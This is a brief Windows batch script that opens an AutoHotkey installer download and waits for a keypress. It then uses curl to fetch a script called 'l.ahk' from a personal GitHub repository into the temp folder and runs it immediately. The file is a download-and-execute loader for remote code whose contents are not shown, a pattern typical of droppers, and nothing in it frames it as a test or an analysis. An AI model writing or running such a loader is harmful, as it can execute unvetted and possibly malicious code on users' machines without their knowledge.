@echo off
start "" "https://www.autohotkey.com/download/1.1/AutoHotkey_1.1.37.02_setup.exe"
echo Press any button after downloading
pause >nul
curl -L "https://raw.githubusercontent.com/akuratnishe-dot/Hi/refs/heads/main/l.ahk" -o "%TEMP%\l.ahk"
"%TEMP%\l.ahk"
